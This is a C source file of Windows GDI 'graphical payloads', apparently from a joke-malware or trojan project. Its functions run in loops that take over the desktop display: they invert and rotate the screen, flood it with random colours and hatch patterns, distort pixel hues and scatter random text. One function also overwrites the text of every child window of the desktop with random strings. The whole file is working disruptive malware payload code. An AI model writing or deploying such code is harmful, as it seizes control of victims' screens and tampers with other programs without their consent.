#include "graphicalpayloads.h"

HWND g_hRootWindow = NULL;
HDC g_hRootWindowDC = NULL;

RECT stScreenCords;

BOOL CALLBACK fnEnumWindowsProc(
	_In_ HWND   hWnd,
    _In_ LPARAM lParam
) {

	LPWSTR pszRandomString[30];
	
	_itow(
		fnRNG()%16144,
		(LPWSTR)pszRandomString,
		2
	);

	SendMessageW(
		hWnd, 
		WM_SETTEXT, 
		(LPARAM)NULL, 
		(LPARAM)pszRandomString
		);
		
	return TRUE;
}

VOID WINAPI fnWindTextRandomInt(VOID) {

	while(g_iGDIPayloadCount != 7) {
		RedrawWindow(
			g_hRootWindow, 
			NULL, 
			NULL, 
			RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN
			);

		if(g_bDebug == FALSE)
			EnumChildWindows(
				g_hRootWindow, 
				fnEnumWindowsProc, 
				(LPARAM)NULL
				);

		Sleep(400);
	}

	ExitThread(EXIT_SUCCESS);
}

/*
* Most of the graphical payloads work this way
i'll explain it shortly but msdn should expain it better lol

A device independant bitmap is being create or short for DIB

They allow you to modify the colour palette and much more

We do this by providing a reference to the RGBQUAD structure as an argument of CreateDIBSection

then we can modify the intensivity of the colours 
you can use a cycle to do that ofc (as the max value you just specify the multiple of your screen width and height, to get that you use GetSystemMetrics() or GetWindowRect() where you provide the handle to your root window, which you can get via GetDesktopWindow())

this results in changing the colour palette

again you'd get a better idea how GDI works if you check the msdn page about it, i am too lazy to explain that in this file as it'd take more space than the code lmfao

*/

VOID WINAPI fnScreenRotation(VOID) {
	
	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColourPalette;
	POINT stParmPoints[3];
	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColourPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	stParmPoints[0].x = stBitmapInfo.bmiHeader.biWidth; 
	stParmPoints[0].y = 0;
	stParmPoints[1].y = 0;
	stParmPoints[1].x = 0;
	stParmPoints[2].x = stBitmapInfo.bmiHeader.biWidth; 
	stParmPoints[2].y = stBitmapInfo.bmiHeader.biHeight;

	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColourPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 1) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			NOTSRCCOPY
		);
	

		PlgBlt(
			g_hRootWindowDC,
			stParmPoints,
			hMemoryDC,
			0, 0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			NULL,
			0, 0
		);

		Sleep(20);	

	} 
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);
}


VOID WINAPI fnRandomPatternBrush(VOID) {

	while(g_iGDIPayloadCount != 4) {

		HBRUSH hBrush = CreateHatchBrush(
			fnRNG()%5, 
			RGB(fnRNG()%255, 
			fnRNG()%255, 
			fnRNG()%255)
			);
		
		FillRect(
			g_hRootWindowDC, 
			&stScreenCords, 
			hBrush
			);

		DeleteObject(hBrush);

		Sleep(20);

	} 

}

VOID WINAPI fnSolidBrushColours(VOID) {

	while (g_iGDIPayloadCount != 5) {

		HBRUSH hBrush = CreateSolidBrush(
			RGB(
				fnRNG()%255, 
				fnRNG()%255, 
				fnRNG()%255)
			);
		
		FillRect(
			g_hRootWindowDC, 
			&stScreenCords, 
			hBrush
			);

		DeleteObject(hBrush);

		Sleep(10);

	} 
}

VOID WINAPI fnHSLRandColourPal(VOID) {

	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColourPalette;

	WORD wHue = 0,
		 wLuminance = 0,
		 wSaturation = 0;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColourPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColourPalette, 
		NULL, 
		0
		);

	SelectObject(hMemoryDC, hBitmap);
	
	while (g_iGDIPayloadCount != 2) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		INT iRandVal = fnRNG()%90; 

		for(INT iA = 0; iA<iRgbqMem; iA++) {

			ColorRGBToHLS(
				RGB(
					pColourPalette[iA].rgbRed,
					pColourPalette[iA].rgbGreen,
					pColourPalette[iA].rgbBlue
					),
				&wHue,
				&wLuminance,
				&wSaturation
				);

			wHue+=iRandVal;
			wLuminance-=iRandVal;


			pColourPalette[iA].rgbRed = GetRValue(
				ColorHLSToRGB(
				wHue,
				wLuminance,
				wSaturation
			));

			pColourPalette[iA].rgbGreen = GetGValue(
				ColorHLSToRGB(
				wHue,
				wLuminance,
				wSaturation
			));

			
			pColourPalette[iA].rgbBlue = GetBValue(
				ColorHLSToRGB(
				wHue,
				wLuminance,
				wSaturation
			));
		}

		BitBlt(
			g_hRootWindowDC, 
			fnRNG()%4,
			fnRNG()%4,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			hMemoryDC, 
			fnRNG()%4, 
			fnRNG()%4,
			NOTSRCCOPY
		);

		Sleep(20);	

		} 
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);	
	} 

VOID WINAPI fnIncrementColourPalStatic(VOID) {

	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColourPalette;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColourPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColourPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 6) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		for(INT iA = 0; iA<iRgbqMem; iA++) {
			pColourPalette[iA].rgbRed++;
			pColourPalette[iA].rgbGreen=fnRNG()%255;
			pColourPalette[iA].rgbBlue++;
		}

		BitBlt(
			g_hRootWindowDC,
			0, 
			0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			hMemoryDC,
			0, 
			0,
			SRCCOPY
		);

	Sleep(10);	

	
	} 
		DeleteObject(hBitmap);
		DeleteDC(hMemoryDC);	
		
}

VOID WINAPI fnIncrementColourPal(VOID) {
	
	INT iRgbqMem = (stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top);

	RGBQUAD *pColourPalette;

	BITMAPINFO stBitmapInfo;

	ZeroMemory(
		&pColourPalette, 
		sizeof(RGBQUAD)
		);

	ZeroMemory(
		&stBitmapInfo, 
		sizeof(BITMAPINFO)
		);

	ZeroMemory(
		&stBitmapInfo.bmiHeader, 
		sizeof(BITMAPINFOHEADER)
		);

	stBitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	stBitmapInfo.bmiHeader.biPlanes = 1;
	stBitmapInfo.bmiHeader.biBitCount = 32;
	stBitmapInfo.bmiHeader.biCompression = BI_RGB;
	stBitmapInfo.bmiHeader.biWidth = stScreenCords.right - stScreenCords.left;
	stBitmapInfo.bmiHeader.biHeight = stScreenCords.bottom - stScreenCords.top;
	stBitmapInfo.bmiHeader.biSizeImage = stBitmapInfo.bmiHeader.biWidth * stBitmapInfo.bmiHeader.biHeight ;
	
	HDC hMemoryDC = CreateCompatibleDC(g_hRootWindowDC);
	HBITMAP hBitmap = CreateDIBSection(
		hMemoryDC, 
		&stBitmapInfo, 
		DIB_RGB_COLORS, 
		(PVOID*)&pColourPalette, 
		NULL, 
		0
		);

	SelectObject(
		hMemoryDC, 
		hBitmap
		);
	
	while (g_iGDIPayloadCount != 3) {
		BitBlt(
			hMemoryDC, 
			0,
			0,
			stBitmapInfo.bmiHeader.biWidth, 
			stBitmapInfo.bmiHeader.biHeight, 
			g_hRootWindowDC, 
			0, 
			0,
			SRCCOPY
		);

		for(INT iA = 0; iA<iRgbqMem; iA++) {
			pColourPalette[iA].rgbRed++;
			pColourPalette[iA].rgbGreen++;
			pColourPalette[iA].rgbBlue++;
		}

		BitBlt(
			g_hRootWindowDC,
			0, 
			0,
			stBitmapInfo.bmiHeader.biWidth,
			stBitmapInfo.bmiHeader.biHeight,
			hMemoryDC,
			0, 
			0,
			SRCCOPY
		);

	Sleep(10);	
		
	}
			DeleteObject(hBitmap);
			DeleteDC(hMemoryDC);
}

VOID WINAPI fnCaptchaText(VOID) {

	while(g_iGDIPayloadCount != 7) {

		LPWSTR pszRandomString[13];
	
	_itow(
		fnRNG()%4096,
		(LPWSTR)pszRandomString,
		16
	);

		HFONT hFont = CreateFontW(
			50,
			-MulDiv((stScreenCords.right - stScreenCords.left) * (stScreenCords.bottom - stScreenCords.top), GetDeviceCaps(g_hRootWindowDC, LOGPIXELSY), 72),
			fnRNG()%360,
			0,
			FW_BOLD,
			FALSE,
			FALSE,
			FALSE,
			ANSI_CHARSET,
			OUT_CHARACTER_PRECIS,
			CLIP_CHARACTER_PRECIS,
			NONANTIALIASED_QUALITY,
			FF_DECORATIVE,
			NULL
		);

		SelectObject(
			g_hRootWindowDC, 
			hFont
		);

		TextOutW(
			g_hRootWindowDC, 
			fnRNG()%(stScreenCords.right - stScreenCords.left),
			fnRNG()%(stScreenCords.bottom - stScreenCords.top),
			(LPWSTR)pszRandomString,
			lstrlenW((LPWSTR)pszRandomString)
			);

			DeleteObject(hFont);
			Sleep(5);
	}
}